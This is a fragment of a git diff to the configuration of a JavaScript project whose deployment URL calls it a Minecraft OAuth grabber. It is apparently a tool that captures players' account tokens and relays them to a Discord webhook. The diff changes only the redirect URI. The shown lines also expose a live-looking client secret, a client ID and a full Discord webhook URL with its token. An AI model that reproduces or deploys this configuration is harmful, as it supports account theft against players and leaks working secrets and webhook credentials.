@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'rUa8Q~ALzlSdRtJI_qnpvsKK2U_nugOR8rfCccPN'
 const client_id = 'f91ed0d2-6473-494a-91f6-5f32066061f1'
-const redirect_uri = 'https://minecraft-o-auth-grabber-mog-4jdv.vercel.app/api/v1/callback'
+const redirect_uri = 'https://minecraft-o-auth-grabber-mog-4jdv.vercel.app/'
 const webhook_url = 'https://discord.com/api/webhooks/1160604080914321448/wz8Kv1TtI-zN3wgGhJ9V1MN1nFbDxU_fQahQm9yM8X0yl67Yqdh-jml_fjofshpcZygT'
 //Requirements
 const axios = require('axios')
